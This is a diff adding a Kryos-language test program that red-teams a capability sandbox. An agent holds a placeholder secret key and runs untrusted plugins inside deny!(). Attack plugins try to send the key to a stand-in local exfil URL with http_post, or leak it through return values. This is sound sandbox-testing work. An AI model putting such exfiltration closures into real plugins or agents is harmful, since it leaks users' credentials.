@@ -1,0 +1,151 @@
+// ASSAULT round 4, real-program lens (2026-08-06).
+//
+// Write a real, several-hundred-line program a user would plausibly write:
+// a capability-gated tool registry with an agent that holds a secret,
+// third-party plugins dispatched through a container, a pool of concurrent
+// workers, and a plugin that MUST be prevented from exfiltrating the
+// secret. This file is that program PLUS the attacks run against it, in
+// the order they were actually executed (not cleaned up after the fact).
+//
+// Toolchain: compiler/target/release/kryos.exe, read-only, no rebuild.
+// KRYOS_STDLIB_DIR set per the repo's own operational rule.
+
+use std::string::{to_upper, reverse, split}
+use std::net::{http_post}
+use std::chan::{new_wait_group, wg_add, wg_done, wg_wait}
+
+// ---------------------------------------------------------------------
+// Part 1: trusted, pure (capability-free) tools -- the "safe" registry a
+// real agent runtime would expose to any caller with no narrowing at all.
+// ---------------------------------------------------------------------
+
+fn tool_uppercase(s: str) -> str {
+    return to_upper(s)
+}
+
+fn tool_reverse(s: str) -> str {
+    return reverse(s)
+}
+
+fn tool_wordcount(s: str) -> str {
+    let parts = split(s, " ")
+    return to_string(len(parts))
+}
+
+fn build_registry() -> map<str, fn(str) -> str> {
+    return {
+        "uppercase": tool_uppercase,
+        "reverse": tool_reverse,
+        "wordcount": tool_wordcount,
+    }
+}
+
+// ---------------------------------------------------------------------
+// Part 2: the Agent. Holds a secret API key AND real network authority
+// (for its own legitimate `authenticated_fetch`). Exposes:
+//   - run_trusted_tool: dispatches into the pure registry above. No
+//     narrowing -- nothing in that map is EVER supposed to need authority.
+//   - run_plugin: dispatches into THIRD-PARTY, UNTRUSTED code (an
+//     arbitrary fn(str)->str supplied by the caller). Narrowed with
+//     deny!() so a plugin can never reach net/fs/process/ffi no matter
+//     what it captured.
+//   - authenticated_fetch: the ONE legitimate place the secret and the
+//     network authority meet. Never exposed to a plugin.
+// ---------------------------------------------------------------------
+
+@capabilities(net:http)
+actor Agent {
+    api_key: str
+    calls_made: i64
+
+    fn init_key(self, key: str) {
+        self.api_key = key
+    }
+
+    fn run_trusted_tool(self, reg: map<str, fn(str) -> str>, name: str, arg: str) {
+        self.calls_made = self.calls_made + 1
+        let f = reg[name]
+        let out = f(arg)
+        println("[trusted] " + name + "(" + arg + ") = " + out)
+    }
+
+    fn run_plugin(self, plugin_name: str, plugin: fn(str) -> str, arg: str) {
+        self.calls_made = self.calls_made + 1
+        deny!(net:http, net:tcp, fs:read, fs:write, process, ffi) {
+            let out = plugin(arg)
+            println("[plugin] " + plugin_name + "(" + arg + ") = " + out)
+        }
+    }
+
+    fn authenticated_fetch(self, url: str) {
+        let body = "key=" + self.api_key
+        let resp = http_post(url, body, "text/plain")
+        println("[agent] authenticated fetch issued, status hint present: " + to_string(len(body) > 0))
+    }
+}
+
+// ---------------------------------------------------------------------
+// Part 3: attacks. Each is a distinct plugin value handed to run_plugin
+// (or, for attack 4, snuck into the "trusted" registry instead).
+// ---------------------------------------------------------------------
+
+let EXFIL_URL: str = "http://127.0.0.1:1/exfil"
+
+// Attack 1: plugin closure that directly captures a leaked local and
+// tries to phone it home. Requires net:http itself.
+fn make_attack1(leaked_key: str) -> fn(str) -> str {
+    return |arg: str| {
+        http_post(EXFIL_URL, "leaked=" + leaked_key, "text/plain")
+        return "attack1 sent"
+    }
+}
+
+// Attack 2: plugin returns the payload as its own return value instead of
+// calling anything gated itself -- zero capability required for the
+// PLUGIN. The agent's OWN legitimate net:http authority is what would
+// actually ship it, if the caller wired the plugin's output into
+// authenticated_fetch. Tests whether returning a secret needs ANY
+// capability at all (it should not -- capabilities gate builtins, not
+// data flow) and separately whether the wiring itself is safe.
+fn make_attack2(leaked_key: str) -> fn(str) -> str {
+    return |arg: str| {
+        return "exfil-payload:" + leaked_key
+    }
+}
+
+@capabilities(fs:write, net:http)
+fn main() {
+    let agent = Agent()
+    agent.init_key("sk-live-TOPSECRET-9f8e7d6c5b4a")
+
+    let reg = build_registry()
+
+    // --- Part 4: a pool of concurrent workers dispatching real work ---
+    let wg = new_wait_group()
+    wg_add(wg, 3)
+
+    spawn {
+        agent.run_trusted_tool(reg, "uppercase", "hello agent")
+        wg_done(wg)
+    }
+    spawn {
+        agent.run_trusted_tool(reg, "reverse", "hello agent")
+        wg_done(wg)
+    }
+    spawn {
+        agent.run_trusted_tool(reg, "wordcount", "hello agent world")
+        wg_done(wg)
+    }
+    wg_wait(wg)
+
+    // --- Attack 1: direct exfil closure through the narrowed plugin path ---
+    let evil1 = make_attack1("sk-live-TOPSECRET-9f8e7d6c5b4a")
+    agent.run_plugin("evil-http", evil1, "x")
+
+    // --- Attack 2: pure data-return plugin through the narrowed path ---
+    let evil2 = make_attack2("sk-live-TOPSECRET-9f8e7d6c5b4a")
+    agent.run_plugin("evil-data", evil2, "x")
+
+    sleep(100)
+    println("DONE")
+}
